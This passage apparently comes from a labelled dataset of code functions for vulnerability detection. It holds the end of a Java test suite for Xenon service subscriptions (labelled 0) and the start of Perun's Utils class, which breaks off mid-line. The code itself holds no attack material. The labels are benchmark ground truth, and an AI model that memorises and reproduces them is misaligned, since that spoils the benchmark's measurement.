subscribe.forceRemote();\n        // replay state\n        serviceHost.startSubscriptionService(subscribe, notificationTarget, ServiceSubscriber\n                .create(false).setUsePublicUri(true));\n        this.host.testWait(subscribeCtx);\n\n        // do an update to cause a notification\n        TestContext updateCtx = this.host.testCreate(1);\n        ExampleServiceState body = new ExampleServiceState();\n        body.name = UUID.randomUUID().toString();\n        this.host.send(Operation.createPatch(uri).setBody(body).setCompletion((o, e) -> {\n            if (e != null) {\n                updateCtx.fail(e);\n                return;\n            }\n            ExampleServiceState rsp = o.getBody(ExampleServiceState.class);\n            ownerHostId[0] = rsp.documentOwner;\n            updateCtx.complete();\n\n        }));\n        this.host.testWait(updateCtx);\n        this.host.testWait(oneUseNotificationCtx);\n\n        // remove subscription\n        TestContext unSubscribeCtx = this.host.testCreate(1);\n        Operation unSubscribe = subscribe.clone()\n                .setCompletion(unSubscribeCtx.getCompletion())\n                .setAction(Action.DELETE);\n        serviceHost.stopSubscriptionService(unSubscribe,\n                notificationTarget.getUri());\n        this.host.testWait(unSubscribeCtx);\n        this.verifySubscriberCount(new URI[] { uri }, 0);\n\n        VerificationHost ownerHost = null;\n        // find the host that owns the example service and make sure we subscribe from the OTHER\n        // host (since we will stop the current owner)\n        for (VerificationHost h : this.host.getInProcessHostMap().values()) {\n            if (!h.getId().equals(ownerHostId[0])) {\n                serviceHost = h;\n            } else {\n                ownerHost = h;\n            }\n        }\n\n        this.host.log(\"Owner node: %s, subscriber node: %s (%s)\", ownerHostId[0],\n                serviceHost.getId(), serviceHost.getUri());\n\n        AtomicInteger reliableNotificationCount = new AtomicInteger();\n        TestContext subscribeCtxNonOwner = this.host.testCreate(1);\n        // subscribe using non owner host\n        subscribe.setCompletion(subscribeCtxNonOwner.getCompletion());\n        serviceHost.startReliableSubscriptionService(subscribe, (o) -> {\n            reliableNotificationCount.incrementAndGet();\n            o.complete();\n        });\n        localHost.testWait(subscribeCtxNonOwner);\n\n        // send explicit update to example service\n        body.name = UUID.randomUUID().toString();\n        this.host.send(Operation.createPatch(uri).setBody(body));\n\n        while (reliableNotificationCount.get() < 1) {\n            Thread.sleep(100);\n        }\n\n        reliableNotificationCount.set(0);\n\n        this.verifySubscriberCount(new URI[] { uri }, 1);\n\n        // Check reliability: determine what host is owner for the example service we subscribed to.\n        // Then stop that host which should cause the remaining host(s) to pick up ownership.\n        // Subscriptions will not survive on their own, but we expect the ReliableSubscriptionService\n        // to notice the subscription is gone on the new owner, and re subscribe.\n        List<URI> exampleSubUris = new ArrayList<>();\n        for (URI hostUri : this.host.getNodeGroupMap().keySet()) {\n            exampleSubUris.add(UriUtils.buildUri(hostUri, uri.getPath(),\n                    ServiceHost.SERVICE_URI_SUFFIX_SUBSCRIPTIONS));\n        }\n\n        // stop host that has ownership of example service\n        NodeGroupConfig cfg = new NodeGroupConfig();\n        cfg.nodeRemovalDelayMicros = TimeUnit.SECONDS.toMicros(2);\n        this.host.setNodeGroupConfig(cfg);\n\n        // relax quorum\n        this.host.setNodeGroupQuorum(1);\n        // stop host with subscription\n        this.host.stopHost(ownerHost);\n\n        factoryUri = UriUtils.buildUri(serviceHost, ExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(factoryUri);\n\n        uri = UriUtils.buildUri(serviceHost.getUri(), uri.getPath());\n\n        // verify that we still have 1 subscription on the remaining host, which can only happen if the\n        // reliable subscription service notices the current owner failure and re subscribed\n        this.verifySubscriberCount(new URI[] { uri }, 1);\n\n        // and test once again that notifications flow.\n        this.host.log(\"Sending PATCH requests to %s\", uri);\n        long c = this.updateCount;\n        for (int i = 0; i < c; i++) {\n            body.name = \"post-stop-\" + UUID.randomUUID().toString();\n            this.host.send(Operation.createPatch(uri).setBody(body));\n        }\n\n        Date exp = this.host.getTestExpiration();\n        while (reliableNotificationCount.get() < c) {\n            Thread.sleep(250);\n            this.host.log(\"Received %d notifications, expecting %d\",\n                    reliableNotificationCount.get(), c);\n            if (new Date().after(exp)) {\n                throw new TimeoutException();\n            }\n        }\n    }\n\n    @Test\n    public void subscriptionsToFactoryAndChildren() throws Throwable {\n        this.host.stop();\n        this.host.setPort(0);\n        this.host.start();\n        this.host.setPublicUri(UriUtils.buildUri(\"localhost\", this.host.getPort(), \"\", null));\n        this.host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n\n        URI factoryUri = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n\n        String prefix = \"example-\";\n        Long counterValue = Long.MAX_VALUE;\n        URI[] childUris = new URI[this.serviceCount];\n\n        doFactoryPostNotifications(factoryUri, this.serviceCount, prefix, counterValue, childUris);\n\n        doNotificationsWithReplayState(childUris);\n\n        doNotificationsWithFailure(childUris);\n\n        doNotificationsWithLimitAndPublicUri(childUris);\n\n        doNotificationsWithExpiration(childUris);\n\n        doDeleteNotifications(childUris, counterValue);\n    }\n\n    @Test\n    public void subscriptionsWithAuth() throws Throwable {\n        VerificationHost hostWithAuth = null;\n        try {\n            String testUserEmail = \"foo@vmware.com\";\n            hostWithAuth = VerificationHost.create(0);\n            hostWithAuth.setAuthorizationEnabled(true);\n            hostWithAuth.start();\n            hostWithAuth.setSystemAuthorizationContext();\n            TestContext waitContext = hostWithAuth.testCreate(1);\n            AuthorizationSetupHelper.create()\n                    .setHost(hostWithAuth)\n                    .setDocumentKind(Utils.buildKind(MinimalTestServiceState.class))\n                    .setUserEmail(testUserEmail)\n                    .setUserSelfLink(testUserEmail)\n                    .setUserPassword(testUserEmail)\n                    .setCompletion(waitContext.getCompletion())\n                    .start();\n            hostWithAuth.testWait(waitContext);\n            hostWithAuth.resetSystemAuthorizationContext();\n            hostWithAuth.assumeIdentity(UriUtils.buildUriPath(ServiceUriPaths.CORE_AUTHZ_USERS, testUserEmail));\n            MinimalTestService s = new MinimalTestService();\n            MinimalTestServiceState serviceState = new MinimalTestServiceState();\n            serviceState.id = UUID.randomUUID().toString();\n            String minimalServiceUUID = UUID.randomUUID().toString();\n            TestContext notifyContext = hostWithAuth.testCreate(1);\n            hostWithAuth.startServiceAndWait(s, minimalServiceUUID, serviceState);\n\n            Consumer<Operation> notifyC = (nOp) -> {\n                nOp.complete();\n                switch (nOp.getAction()) {\n                case PUT:\n                    notifyContext.completeIteration();\n                    break;\n                default:\n                    break;\n\n                }\n            };\n\n            hostWithAuth.setSystemAuthorizationContext();\n            Operation subscribe = Operation.createPost(UriUtils.buildUri(hostWithAuth, minimalServiceUUID));\n            subscribe.setReferer(hostWithAuth.getReferer());\n            ServiceSubscriber subscriber = new ServiceSubscriber();\n            subscriber.replayState = true;\n            hostWithAuth.startSubscriptionService(subscribe, notifyC, subscriber);\n            hostWithAuth.resetAuthorizationContext();\n            hostWithAuth.testWait(notifyContext);\n        } finally {\n            if (hostWithAuth != null) {\n                hostWithAuth.tearDown();\n            }\n        }\n    }\n\n    @Test\n    public void testSubscriptionsWithExpiry() throws Throwable {\n        MinimalTestService s = new MinimalTestService();\n        MinimalTestServiceState serviceState = new MinimalTestServiceState();\n        serviceState.id = UUID.randomUUID().toString();\n        String minimalServiceUUID = UUID.randomUUID().toString();\n        TestContext notifyContext = this.host.testCreate(1);\n        TestContext notifyDeleteContext = this.host.testCreate(1);\n        this.host.startServiceAndWait(s, minimalServiceUUID, serviceState);\n\n        Service notificationTarget = new StatelessService() {\n            @Override\n            public void authorizeRequest(Operation op) {\n                op.complete();\n                return;\n            }\n\n            @Override\n            public void handleRequest(Operation op) {\n                if (!op.isNotification()) {\n                    if (op.getAction() == Action.DELETE && op.getUri().equals(getUri())) {\n                        notifyDeleteContext.completeIteration();\n                    }\n                    super.handleRequest(op);\n                    return;\n                }\n                if (op.getAction() == Action.PUT) {\n                    notifyContext.completeIteration();\n                }\n            }\n        };\n        Operation subscribe = Operation.createPost(UriUtils.buildUri(host, minimalServiceUUID));\n        subscribe.setReferer(host.getReferer());\n        ServiceSubscriber subscriber = new ServiceSubscriber();\n        subscriber.replayState = true;\n        // Set a 500ms expiry\n        subscriber.documentExpirationTimeMicros = Utils\n                .fromNowMicrosUtc(TimeUnit.MILLISECONDS.toMicros(500));\n        host.startSubscriptionService(subscribe, notificationTarget, subscriber);\n        host.testWait(notifyContext);\n        host.testWait(notifyDeleteContext);\n    }\n\n    @Test\n    public void subscribeAndWaitForServiceAvailability() throws Throwable {\n        // until HTTP2 support is we must only subscribe to less than max connections!\n        // otherwise we deadlock: the connection for the queued subscribe is used up,\n        // no more connections can be created, to that owner.\n        this.serviceCount = NettyHttpServiceClient.DEFAULT_CONNECTIONS_PER_HOST / 2;\n        setUpPeers();\n\n        this.host.waitForReplicatedFactoryServiceAvailable(\n                this.host.getPeerServiceUri(ExampleService.FACTORY_LINK));\n\n        // Pick one host to post to\n        VerificationHost serviceHost = this.host.getPeerHost();\n\n        // Create example service states to subscribe to\n        List<ExampleServiceState> states = new ArrayList<>();\n        for (int i = 0; i < this.serviceCount; i++) {\n            ExampleServiceState state = new ExampleServiceState();\n            state.documentSelfLink = UriUtils.buildUriPath(\n                    ExampleService.FACTORY_LINK,\n                    UUID.randomUUID().toString());\n            state.name = UUID.randomUUID().toString();\n            states.add(state);\n        }\n\n        AtomicInteger notifications = new AtomicInteger();\n        // Subscription target\n        ServiceSubscriber sr = createAndStartNotificationTarget((update) -> {\n            if (update.getAction() != Action.PATCH) {\n                // because we start multiple nodes and we do not wait for factory start\n                // we will receive synchronization related PUT requests, on each service.\n                // Ignore everything but the PATCH we send from the test\n                return false;\n            }\n            this.host.completeIteration();\n            this.host.log(\"notification %d\", notifications.incrementAndGet());\n            update.complete();\n            return true;\n        });\n\n        this.host.log(\"Subscribing to %d services\", this.serviceCount);\n        // Subscribe to factory (will not complete until factory is started again)\n        for (ExampleServiceState state : states) {\n            URI uri = UriUtils.buildUri(serviceHost, state.documentSelfLink);\n            subscribeToService(uri, sr);\n        }\n\n        // First the subscription requests will be sent and will be queued.\n        // So N completions come from the subscribe requests.\n        // After that, the services will be POSTed and started. This is the second set\n        // of N completions.\n        this.host.testStart(2 * this.serviceCount);\n        this.host.log(\"Sending parallel POST for %d services\", this.serviceCount);\n\n        AtomicInteger postCount = new AtomicInteger();\n        // Create example services, triggering subscriptions to complete\n        for (ExampleServiceState state : states) {\n            URI uri = UriUtils.buildFactoryUri(serviceHost, ExampleService.class);\n            Operation op = Operation.createPost(uri)\n                    .setBody(state)\n                    .setCompletion((o, e) -> {\n                        if (e != null) {\n                            this.host.failIteration(e);\n                            return;\n                        }\n                        this.host.log(\"POST count %d\", postCount.incrementAndGet());\n                        this.host.completeIteration();\n                    });\n            this.host.send(op);\n        }\n\n        this.host.testWait();\n\n        this.host.testStart(2 * this.serviceCount);\n        // now send N PATCH ops so we get notifications\n        for (ExampleServiceState state : states) {\n            // send a PATCH, to trigger notification\n            URI u = UriUtils.buildUri(serviceHost, state.documentSelfLink);\n            state.counter = Utils.getNowMicrosUtc();\n            Operation patch = Operation.createPatch(u)\n                    .setBody(state)\n                    .setCompletion(this.host.getCompletion());\n            this.host.send(patch);\n        }\n        this.host.testWait();\n    }\n\n    private void doFactoryPostNotifications(URI factoryUri, int childCount, String prefix,\n            Long counterValue,\n            URI[] childUris) throws Throwable {\n        this.host.log(\"starting subscription to factory\");\n        this.host.testStart(1);\n        // let the service host update the URI from the factory to its subscriptions\n        Operation subscribeOp = Operation.createPost(factoryUri)\n                .setReferer(this.host.getReferer())\n                .setCompletion(this.host.getCompletion());\n        URI notificationTarget = host.startSubscriptionService(subscribeOp, (o) -> {\n            if (o.getAction() == Action.POST) {\n                this.host.completeIteration();\n            } else {\n                this.host.failIteration(new IllegalStateException(\"Unexpected notification: \"\n                        + o.toString()));\n            }\n        });\n        this.host.testWait();\n\n        // expect a POST notification per child, a POST completion per child\n        this.host.testStart(childCount * 2);\n        for (int i = 0; i < childCount; i++) {\n            ExampleServiceState initialState = new ExampleServiceState();\n            initialState.name = initialState.documentSelfLink = prefix + i;\n            initialState.counter = counterValue;\n            final int finalI = i;\n\n            // create an example service\n            this.host.send(Operation\n                    .createPost(factoryUri)\n                    .setBody(initialState).setCompletion((o, e) -> {\n                        if (e != null) {\n                            this.host.failIteration(e);\n                            return;\n                        }\n                        ServiceDocument rsp = o.getBody(ServiceDocument.class);\n                        childUris[finalI] = UriUtils.buildUri(this.host, rsp.documentSelfLink);\n                        this.host.completeIteration();\n                    }));\n        }\n        this.host.testWait();\n\n        this.host.testStart(1);\n        Operation delete = subscribeOp.clone().setUri(factoryUri).setAction(Action.DELETE);\n        this.host.stopSubscriptionService(delete, notificationTarget);\n        this.host.testWait();\n        this.verifySubscriberCount(new URI[]{factoryUri}, 0);\n    }\n\n    private void doNotificationsWithReplayState(URI[] childUris)\n            throws Throwable {\n        this.host.log(\"starting subscription with replay\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(\n                UUID.randomUUID().toString(),\n                deletesRemainingCount);\n        sr.replayState = true;\n        // Subscribe to notifications from every example service; get notified with current state\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n\n        patchChildren(childUris, false);\n\n        patchChildren(childUris, false);\n\n        // Finally un subscribe the notification handlers\n        unsubscribeFromChildren(childUris, sr.reference, false);\n        verifySubscriberCount(childUris, 0);\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void doNotificationsWithExpiration(URI[] childUris)\n            throws Throwable {\n        this.host.log(\"starting subscription with expiration\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n\n        // start a notification target that will not complete test iterations since expirations race\n        // with notifications, allowing for notifications to be processed after the next test starts\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount, false, false);\n        sr.documentExpirationTimeMicros = Utils.fromNowMicrosUtc(\n                this.host.getMaintenanceIntervalMicros() * 2);\n        // Subscribe to notifications from every example service; get notified with current state\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n\n        Thread.sleep((this.host.getMaintenanceIntervalMicros() / 1000) * 2);\n        // do a patch which will cause the publisher to evaluate and expire subscriptions\n        patchChildren(childUris, true);\n\n        verifySubscriberCount(childUris, 0);\n\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void deleteNotificationTarget(AtomicInteger deletesRemainingCount,\n            ServiceSubscriber sr) throws Throwable {\n        deletesRemainingCount.set(1);\n        TestContext ctx = testCreate(1);\n        this.host.send(Operation.createDelete(sr.reference)\n                .setCompletion((o, e) -> ctx.completeIteration()));\n        testWait(ctx);\n    }\n\n    private void doNotificationsWithFailure(URI[] childUris) throws Throwable, InterruptedException {\n        this.host.log(\"starting subscription with failure, stopping notification target\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        // Re subscribe, but stop the notification target, causing automatic removal of the\n        // subscriptions\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n        deleteNotificationTarget(deletesRemainingCount, sr);\n\n        // send updates and expect failure in delivering notifications\n        patchChildren(childUris, true);\n        // expect the publisher to note at least one failed notification attempt\n        verifySubscriberCount(true, childUris, 1, 1L);\n\n        // restart notification target service but expect a pragma in the notifications\n        // saying we missed some\n        boolean expectSkippedNotificationsPragma = true;\n        this.host.log(\"restarting notification target\");\n        createAndStartNotificationTarget(sr.reference.getPath(),\n                deletesRemainingCount, expectSkippedNotificationsPragma, true);\n\n        // send some more updates, this time expect ZERO failures;\n        patchChildren(childUris, false);\n        verifySubscriberCount(true, childUris, 1, 0L);\n\n        this.host.log(\"stopping notification target, again\");\n        deleteNotificationTarget(deletesRemainingCount, sr);\n\n        while (!verifySubscriberCount(false, childUris, 0, null)) {\n            Thread.sleep(VerificationHost.FAST_MAINT_INTERVAL_MILLIS);\n            patchChildren(childUris, true);\n        }\n\n        this.host.log(\"Verifying all subscriptions have been removed\");\n        // because we sent more than K updates, causing K + 1 notification delivery failures,\n        // the subscriptions should all be automatically removed!\n        verifySubscriberCount(childUris, 0);\n    }\n\n    private void doNotificationsWithLimitAndPublicUri(URI[] childUris) throws Throwable,\n            InterruptedException, TimeoutException {\n        this.host.log(\"starting subscription with limit and public uri\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        // Re subscribe, use public URI and limit notifications to one.\n        // After these notifications are sent, we should see all subscriptions removed\n        deletesRemainingCount.set(childUris.length + 1);\n        sr.usePublicUri = true;\n        sr.notificationLimit = this.updateCount;\n\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n        // Issue another patch request on every example service instance\n        patchChildren(childUris, false);\n\n        // because we set notificationLimit, all subscriptions should be removed\n        verifySubscriberCount(childUris, 0);\n\n        Date exp = this.host.getTestExpiration();\n        // verify we received DELETEs on the notification target when a subscription was removed\n        while (deletesRemainingCount.get() != 1) {\n            Thread.sleep(250);\n            if (new Date().after(exp)) {\n                throw new TimeoutException(\"DELETEs not received at notification target:\"\n                        + deletesRemainingCount.get());\n            }\n        }\n\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void doDeleteNotifications(URI[] childUris, Long counterValue) throws Throwable {\n        this.host.log(\"starting subscription for DELETEs\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        subscribeToServices(childUris, sr);\n\n        // Issue DELETEs and verify the subscription was notified\n        this.host.testStart(childUris.length * 2);\n        for (URI child : childUris) {\n            ExampleServiceState initialState = new ExampleServiceState();\n            initialState.counter = counterValue;\n            Operation delete = Operation\n                    .createDelete(child)\n                    .setBody(initialState)\n                    .setCompletion(this.host.getCompletion());\n            this.host.send(delete);\n        }\n        this.host.testWait();\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(String link,\n            final AtomicInteger deletesRemainingCount) throws Throwable {\n        return createAndStartNotificationTarget(link, deletesRemainingCount, false, true);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(String link,\n            final AtomicInteger deletesRemainingCount,\n            boolean expectSkipNotificationsPragma,\n            boolean completeIterations) throws Throwable {\n        final AtomicBoolean seenSkippedNotificationPragma =\n                new AtomicBoolean(false);\n\n        return createAndStartNotificationTarget(link, (update) -> {\n            if (!update.isNotification()) {\n                if (update.getAction() == Action.DELETE) {\n                    int r = deletesRemainingCount.decrementAndGet();\n                    if (r != 0) {\n                        update.complete();\n                        return true;\n                    }\n                }\n                return false;\n            }\n\n            if (update.getAction() != Action.PATCH &&\n                    update.getAction() != Action.PUT &&\n                    update.getAction() != Action.DELETE) {\n                update.complete();\n                return true;\n            }\n\n            if (expectSkipNotificationsPragma) {\n                String pragma = update.getRequestHeader(Operation.PRAGMA_HEADER);\n                if (!seenSkippedNotificationPragma.get() && (pragma == null\n                        || !pragma.contains(Operation.PRAGMA_DIRECTIVE_SKIPPED_NOTIFICATIONS))) {\n                    this.host.failIteration(new IllegalStateException(\n                            \"Missing skipped notification pragma\"));\n                    return true;\n                } else {\n                    seenSkippedNotificationPragma.set(true);\n                }\n            }\n\n            if (completeIterations) {\n                this.host.completeIteration();\n            }\n\n            update.complete();\n            return true;\n        });\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(\n            Function<Operation, Boolean> h) throws Throwable {\n        return createAndStartNotificationTarget(UUID.randomUUID().toString(), h);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(\n            String link,\n            Function<Operation, Boolean> h) throws Throwable {\n        StatelessService notificationTarget = createNotificationTargetService(h);\n\n        // Start notification target (shared between subscriptions)\n        Operation startOp = Operation\n                .createPost(UriUtils.buildUri(this.host, link))\n                .setCompletion(this.host.getCompletion())\n                .setReferer(this.host.getReferer());\n        this.host.testStart(1);\n        this.host.startService(startOp, notificationTarget);\n        this.host.testWait();\n\n        ServiceSubscriber sr = new ServiceSubscriber();\n        sr.reference = notificationTarget.getUri();\n        return sr;\n    }\n\n    private StatelessService createNotificationTargetService(Function<Operation, Boolean> h) {\n        return new StatelessService() {\n            @Override\n            public void handleRequest(Operation update) {\n                if (!h.apply(update)) {\n                    super.handleRequest(update);\n                }\n            }\n        };\n    }\n\n    private void subscribeToServices(URI[] uris, ServiceSubscriber sr) throws Throwable {\n        int expectedCompletions = uris.length;\n        if (sr.replayState) {\n            expectedCompletions *= 2;\n        }\n        subscribeToServices(uris, sr, expectedCompletions);\n    }\n\n    private void subscribeToServices(URI[] uris, ServiceSubscriber sr, int expectedCompletions) throws Throwable {\n        this.host.testStart(expectedCompletions);\n        for (int i = 0; i < uris.length; i++) {\n            subscribeToService(uris[i], sr);\n        }\n        this.host.testWait();\n    }\n\n    private void subscribeToService(URI uri, ServiceSubscriber sr) {\n        if (sr.usePublicUri) {\n            sr = Utils.clone(sr);\n            sr.reference = UriUtils.buildPublicUri(this.host, sr.reference.getPath());\n        }\n\n        URI subUri = UriUtils.buildSubscriptionUri(uri);\n        this.host.send(Operation.createPost(subUri)\n                .setCompletion(this.host.getCompletion())\n                .setReferer(this.host.getReferer())\n                .setBody(sr)\n                .addPragmaDirective(Operation.PRAGMA_DIRECTIVE_QUEUE_FOR_SERVICE_AVAILABILITY));\n    }\n\n    private void unsubscribeFromChildren(URI[] uris, URI targetUri,\n            boolean useServiceHostStopSubscription) throws Throwable {\n        int count = uris.length;\n        TestContext ctx = testCreate(count);\n        for (int i = 0; i < count; i++) {\n            if (useServiceHostStopSubscription) {\n                // stop the subscriptions using the service host API\n                host.stopSubscriptionService(\n                        Operation.createDelete(uris[i])\n                                .setCompletion(ctx.getCompletion()),\n                        targetUri);\n                continue;\n            }\n            ServiceSubscriber unsubscribeBody = new ServiceSubscriber();\n            unsubscribeBody.reference = targetUri;\n\n            URI subUri = UriUtils.buildSubscriptionUri(uris[i]);\n            this.host.send(Operation.createDelete(subUri)\n                    .setCompletion(ctx.getCompletion())\n                    .setBody(unsubscribeBody));\n        }\n        testWait(ctx);\n    }\n\n    private boolean verifySubscriberCount(URI[] uris, int subscriberCount) throws Throwable {\n        return verifySubscriberCount(true, uris, subscriberCount, null);\n    }\n\n    private boolean verifySubscriberCount(boolean wait, URI[] uris, int subscriberCount,\n            Long failedNotificationCount)\n            throws Throwable {\n        URI[] subUris = new URI[uris.length];\n        int i = 0;\n        for (URI u : uris) {\n            URI subUri = UriUtils.buildSubscriptionUri(u);\n            subUris[i++] = subUri;\n        }\n\n        AtomicBoolean isConverged = new AtomicBoolean();\n        this.host.waitFor(\"subscriber verification timed out\", () -> {\n            isConverged.set(true);\n            Map<URI, ServiceSubscriptionState> subStates = new ConcurrentSkipListMap<>();\n            TestContext ctx = this.host.testCreate(uris.length);\n            for (URI u : subUris) {\n                this.host.send(Operation.createGet(u).setCompletion((o, e) -> {\n                    ServiceSubscriptionState s = null;\n                    if (e == null) {\n                        s = o.getBody(ServiceSubscriptionState.class);\n                    } else {\n                        this.host.log(\"error response from %s: %s\", o.getUri(), e.getMessage());\n                        // because we stopped an owner node, if gossip is not updated a GET\n                        // to subscriptions might fail because it was forward to a stale node\n                        s = new ServiceSubscriptionState();\n                        s.subscribers = new HashMap<>();\n                    }\n                    subStates.put(o.getUri(), s);\n                    ctx.complete();\n                }));\n            }\n            ctx.await();\n\n            for (ServiceSubscriptionState state : subStates.values()) {\n                int expected = subscriberCount;\n                int actual = state.subscribers.size();\n                if (actual != expected) {\n                    isConverged.set(false);\n                    break;\n                }\n\n                if (failedNotificationCount == null) {\n                    continue;\n                }\n\n                for (ServiceSubscriber sr : state.subscribers.values()) {\n                    if (sr.failedNotificationCount == null && failedNotificationCount == 0) {\n                        continue;\n                    }\n                    if (sr.failedNotificationCount == null\n                            || 0 != sr.failedNotificationCount.compareTo(failedNotificationCount)) {\n                        isConverged.set(false);\n                        break;\n                    }\n                }\n\n            }\n            if (isConverged.get() || !wait) {\n                return true;\n            }\n\n            return false;\n        });\n\n        return isConverged.get();\n    }\n\n    private void patchChildren(URI[] uris, boolean expectFailure) throws Throwable {\n        int count = expectFailure ? uris.length : uris.length * 2;\n        long c = this.updateCount;\n        if (!expectFailure) {\n            count *= this.updateCount;\n        } else {\n            c = 1;\n        }\n\n        this.host.testStart(count);\n        for (int i = 0; i < uris.length; i++) {\n            for (int k = 0; k < c; k++) {\n                ExampleServiceState initialState = new ExampleServiceState();\n                initialState.counter = Long.MAX_VALUE;\n                Operation patch = Operation\n                        .createPatch(uris[i])\n                        .setBody(initialState)\n                        .setCompletion(this.host.getCompletion());\n                this.host.send(patch);\n            }\n        }\n        this.host.testWait();\n    }\n}\n", "target": 0}
{"idx": 1098, "func": "package cz.metacentrum.perun.core.impl;\n\nimport com.zaxxer.hikari.HikariDataSource;\nimport cz.metacentrum.perun.core.api.Attribute;\nimport cz.metacentrum.perun.core.api.AttributeDefinition;\nimport cz.metacentrum.perun.core.api.BeansUtils;\nimport cz.metacentrum.perun.core.api.Destination;\nimport cz.metacentrum.perun.core.api.ExtSource;\nimport cz.metacentrum.perun.core.api.Member;\nimport cz.metacentrum.perun.core.api.Pair;\nimport cz.metacentrum.perun.core.api.PerunSession;\nimport cz.metacentrum.perun.core.api.User;\nimport cz.metacentrum.perun.core.api.UserExtSource;\nimport cz.metacentrum.perun.core.api.exceptions.AttributeNotExistsException;\nimport cz.metacentrum.perun.core.api.exceptions.ConsistencyErrorException;\nimport cz.metacentrum.perun.core.api.exceptions.DiacriticNotAllowedException;\nimport cz.metacentrum.perun.core.api.exceptions.ExtSourceExistsException;\nimport cz.metacentrum.perun.core.api.exceptions.ExtSourceNotExistsException;\nimport cz.metacentrum.perun.core.api.exceptions.IllegalArgumentException;\nimport cz.metacentrum.perun.core.api.exceptions.InternalErrorException;\nimport cz.metacentrum.perun.core.api.exceptions.MaxSizeExceededException;\nimport cz.metacentrum.perun.core.api.exceptions.MemberNotExistsException;\nimport cz.metacentrum.perun.core.api.exceptions.MinSizeExceededException;\nimport cz.metacentrum.perun.core.api.exceptions.NumberNotInRangeException;\nimport cz.metacentrum.perun.core.api.exceptions.NumbersNotAllowedException;\nimport cz.metacentrum.perun.core.api.exceptions.ParseUserNameException;\nimport cz.metacentrum.perun.core.api.exceptions.ParserException;\nimport cz.metacentrum.perun.core.api.exceptions.PrivilegeException;\nimport cz.metacentrum.perun.core.api.exceptions.SpaceNotAllowedException;\nimport cz.metacentrum.perun.core.api.exceptions.SpecialCharsNotAllowedException;\nimport cz.metacentrum.perun.core.api.exceptions.UserNotExistsException;\nimport cz.metacentrum.perun.core.api.exceptions.WrongAttributeAssignmentException;\nimport cz.metacentrum.perun.core.api.exceptions.WrongPatternException;\nimport cz.metacentrum.perun.core.bl.PerunBl;\nimport cz.metacentrum.perun.core.blImpl.ModulesUtilsBlImpl;\nimport org.apache.commons.codec.binary.Base64;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.jdbc.core.RowMapper;\nimport org.springframework.mail.MailException;\nimport org.springframework.mail.SimpleMailMessage;\nimport org.springframework.mail.javamail.JavaMailSender;\nimport org.springframework.mail.javamail.JavaMailSenderImpl;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.Mac;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.sql.DataSource;\nimport java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.UnsupportedEncodingException;\nimport java.math.BigDecimal;\nimport java.math.BigInteger;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.text.Normalizer;\nimport java.text.Normalizer.Form;\nimport java.text.StringCharacterIterator;\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\nimport java.time.format.DateTimeFormatter;\nimport java.time.temporal.ChronoUnit;\nimport java.time.temporal.TemporalUnit;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Enumeration;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\nimport java.util.Properties;\nimport java.util.Set;\nimport java.util.StringJoiner;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\n/**\n * Utilities.\n */\npublic class Utils {\n\n\tprivate final static Logger log = LoggerFactory.getLogger(Utils.class);\n\tpublic final static String configurationsLocations = \"/etc/perun/\";\n\tpublic static final String TITLE_BEFORE = \"titleBefore\";\n\tpublic static final String FIRST_NAME = \"firstName\";\n\tpublic static final String LAST_NAME = \"lastName\";\n\tpublic static final String TITLE_AFTER = \"titleAfter\";\n\tprivate static Properties properties;\n\tpublic static final Pattern emailPattern = Pattern.compile(\"^[-_A-Za-z0-9+']+(\\\\.[-_A-Za-z0-9+']+)*@[-A-Za-z0-9]+(\\\\.[-A-Za-z0-9]+)*(\\\\.[A-Za-z]{2,})$\");\n\n\tprivate static final Pattern titleBeforePattern = Pattern.compile(\"^(([\\\\p{L}]+[.])|(et))$\");\n\tprivate static final Pattern firstNamePattern = Pattern.compile(\"^[\\\\p{L}-']+$\");\n\tprivate static final Pattern lastNamePattern = Pattern.compile(\"^(([\\\\p{L}-']+)|([\\\\p{L}][.]))$\");\n\n\tprivate static final String userPhoneAttribute = \"urn:perun:user:attribute-def:def:phone\";\n\tprivate static final String memberPhoneAttribute = 